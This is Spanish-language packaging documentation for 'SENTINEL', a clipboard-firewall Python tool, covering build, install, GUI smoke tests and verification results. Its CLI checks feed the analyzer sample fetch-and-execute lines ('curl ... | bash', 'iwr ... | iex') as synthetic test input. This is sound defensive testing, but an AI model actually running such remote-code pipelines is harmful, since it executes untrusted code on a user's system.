# Construcción e instalación de paquetes Python

## Construir

Desde la raíz del repositorio, con Python 3.11 o superior:

```sh
python3 -m venv .venv
.venv/bin/python -m pip install 'build>=1.2,<2'
.venv/bin/python -m build
```

Se generan `dist/sentinel_clipboard_firewall-0.0.1.tar.gz` (sdist) y
`dist/sentinel_clipboard_firewall-0.0.1-py3-none-any.whl` (wheel).
La orden construye primero el sdist y después el wheel desde ese sdist,
con dependencias de construcción en entornos aislados. Requiere acceso al
índice de paquetes o un índice/cache local que proporcione esas herramientas.
`build` es una herramienta de desarrollo: no es una dependencia de ejecución
de SENTINEL. Setuptools se declara únicamente como backend de construcción.
No se publica nada al ejecutar estas órdenes.

## Contenido esperado

- Wheel: módulos Python de `sentinel` (incluida la GUI), metadatos y puntos
  de entrada `sentinel` y `sentinel-gui`. No contiene Qt ni las pruebas.
- Sdist: código, pruebas sintéticas, documentación, README, pyproject.toml,
  MANIFEST.in y metadatos generados por setuptools. `setup.cfg` y
  `src/sentinel_clipboard_firewall.egg-info/` son metadatos de construcción.
- Ninguno debe contener `.venv`, `.git`, cachés, bytecode, archivos `.env`,
  distribuciones anteriores ni archivos ajenos al producto.

El descubrimiento de paquetes se restringe a `sentinel` y `sentinel.*` bajo
`src`, con namespaces implícitos desactivados. El wheel no incorpora datos
adicionales del árbol fuente. MANIFEST.in controla las inclusiones del sdist.
Revisa siempre los archivos resultantes, también después de añadir recursos:

```sh
python3 -m zipfile -l dist/sentinel_clipboard_firewall-0.0.1-py3-none-any.whl
python3 -m tarfile -l dist/sentinel_clipboard_firewall-0.0.1.tar.gz
```

## Instalar el wheel sin Qt

Desde el repositorio, guarda su ruta absoluta y usa un entorno nuevo:

```sh
SENTINEL_WHEEL="$PWD/dist/sentinel_clipboard_firewall-0.0.1-py3-none-any.whl"
python3 -m venv /tmp/sentinel-cli-check
/tmp/sentinel-cli-check/bin/python -m pip install --no-index "$SENTINEL_WHEEL"
cd /tmp
printf 'password=Synthetic42 host=10.20.30.40' | /tmp/sentinel-cli-check/bin/sentinel scan
printf 'password=Synthetic42 host=10.20.30.40' | /tmp/sentinel-cli-check/bin/sentinel sanitize
printf '%s\n' 'curl https://example.invalid/synthetic.sh | bash' | /tmp/sentinel-cli-check/bin/sentinel check-command
printf '%s\n' 'iwr https://example.invalid/synthetic.ps1 | iex' | /tmp/sentinel-cli-check/bin/sentinel check-command --shell powershell
/tmp/sentinel-cli-check/bin/sentinel-gui
/tmp/sentinel-cli-check/bin/python -m pip check
```

Sin el extra GUI, PySide6 no se instala. `sentinel-gui` debe devolver código 2,
sin traceback, con un diagnóstico que indique instalar
`sentinel-clipboard-firewall[gui]`. La CLI base no requiere Qt ni build.
Las URLs de los ejemplos son datos para los analizadores; no se ejecutan
los pipelines ni se realizan descargas.

## Instalar con GUI

Usa otro entorno nuevo y la misma ruta absoluta al wheel:

```sh
python3 -m venv /tmp/sentinel-gui-check
/tmp/sentinel-gui-check/bin/python -m pip install "${SENTINEL_WHEEL}[gui]"
/tmp/sentinel-gui-check/bin/python -m pip check
/tmp/sentinel-gui-check/bin/sentinel-gui
```

La última orden abre una ventana y requiere una sesión gráfica compatible.
Para pruebas automatizadas se usa `QT_QPA_PLATFORM=offscreen` con cierre
programado; ejecutar solo el lanzador en ese modo dejaría el bucle de eventos
activo hasta cerrar la ventana. No se lee ni escribe el portapapeles real.
El extra instala los binarios y dependencias de PySide6; no están embebidos
en el wheel de SENTINEL.

Ejemplo de lanzamiento offscreen del punto de entrada instalado, con cierre
programado de la ventana real:

```sh
QT_QPA_PLATFORM=offscreen /tmp/sentinel-gui-check/bin/python -I - <<'PY'
from pathlib import Path
import runpy
import sys
from PySide6.QtCore import QTimer
import sentinel.gui.window as gui

seen = []

class SmokeWindow(gui.Window):
    def __init__(self):
        super().__init__()
        QTimer.singleShot(0, self.verify_and_close)

    def verify_and_close(self):
        seen.append(self.isVisible())
        self.close()

gui.Window = SmokeWindow
try:
    runpy.run_path(str(Path(sys.executable).parent / 'sentinel-gui'), run_name='__main__')
except SystemExit as stopped:
    assert stopped.code == 0
assert seen == [True]
PY
```

## Reconstruir desde el sdist

Vuelve a la raíz del repositorio. Extrae el sdist en un directorio nuevo y
construye exclusivamente desde allí:

```sh
SENTINEL_BUILD_PYTHON="$PWD/.venv/bin/python"
SENTINEL_SDIST="$PWD/dist/sentinel_clipboard_firewall-0.0.1.tar.gz"
mkdir -p /tmp/sentinel-sdist-check
cd /tmp/sentinel-sdist-check
tar -xzf "$SENTINEL_SDIST"
"$SENTINEL_BUILD_PYTHON" -m build --wheel sentinel_clipboard_firewall-0.0.1
```

Estas variables se establecen desde la raíz del repositorio. El backend
se ejecuta en un entorno aislado. Instala el wheel reconstruido en un entorno
de comprobación y repite las pruebas de CLI y `pip check`.

## Verificación y límites de plataforma

La comprobación se realiza con instalaciones normales del wheel, sin modo
editable, desde fuera del repositorio, sin PYTHONPATH y con entornos separados
para CLI y GUI. Se revisan tanto los archivos como los metadatos: Python
`>=3.11`, PySide6 condicionado únicamente al extra `gui`, y ambos puntos de
entrada. La suite del repositorio se ejecuta con el extra GUI instalado.

### Resultados comprobados el 22 de octubre de 2026

Entorno: Fedora Linux 44, x86_64, CPython 3.14.7. Herramientas: build 1.6.1 y
setuptools 84.2.1 en los entornos aislados de construcción. Extra GUI:
PySide6/Qt 6.12.0.

| Comprobación ejecutada | Resultado |
|---|---|
| `python -m build`, con aislamiento | Wheel y sdist construidos |
| Inventario exacto del wheel | 27 archivos: 22 módulos y 5 metadatos |
| Inventario exacto del sdist | 48 archivos de código, documentación, pruebas y configuración/metadatos |
| Exclusiones y metadatos de ambos paquetes | Sin entornos, cachés, bytecode, `.git`, `.env` ni archivos ajenos; Qt solo condicionado al extra `gui` |
| Wheel en entorno CLI creado limpio | Sin PySide6 ni build; importación desde site-packages, no editable |
| CLI desde fuera del repositorio, sin PYTHONPATH | scan, sanitize, Bash y PowerShell correctos con datos sintéticos; metadatos sin valores originales |
| Lanzador GUI sin el extra | Código 2, diagnóstico seguro indicando el extra, sin traceback ni entrada |
| Wheel con extra GUI en otro entorno creado limpio | Lanzador instalado abierto mediante harness offscreen; ventana visible, acciones reales de inspección/sanitización con QtTest y cierre limpio |
| Wheel reconstruido desde sdist extraído fuera del repositorio | Construcción aislada correcta; mismos archivos y contenidos de wheel; instalación y pruebas CLI repetidas |
| `pip check` en ambos entornos de comprobación | Sin dependencias rotas |
| Suite del repositorio con GUI | 116 pruebas aprobadas, incluidas 32 GUI; ninguna omitida |
| `compileall` y `git diff --check` | Sin errores |

Los inventarios se compararon con los módulos, documentos y pruebas esperados,
no solo buscando nombres de cachés. También se validaron los puntos de entrada,
la condición del extra GUI y la integridad de los archivos Python. No se usó el
portapapeles real, ni se ejecutó el contenido analizado. No se publicaron
paquetes ni se crearon releases. No se afirma reproducibilidad binaria entre
fechas o versiones distintas de las herramientas de construcción.

### Verificaciones pendientes

El wheel es Python puro; la etiqueta `py3-none-any` no certifica el soporte
de todas las plataformas. La integración de portapapeles requiere Fedora/Wayland
y `wl-clipboard`, instalado por separado. La GUI depende de los binarios y
bibliotecas de plataforma de Qt. Una prueba offscreen no sustituye comprobar
el escritorio nativo, foco, temas, HiDPI ni el compositor Wayland. La matriz
de otras versiones de Python y de otros sistemas operativos también requiere
verificación específica.

Las órdenes de construcción siguen la documentación de
[build](https://build.pypa.io/en/stable/) y el control de archivos de
[setuptools](https://setuptools.pypa.io/en/latest/userguide/miscellaneous.html).
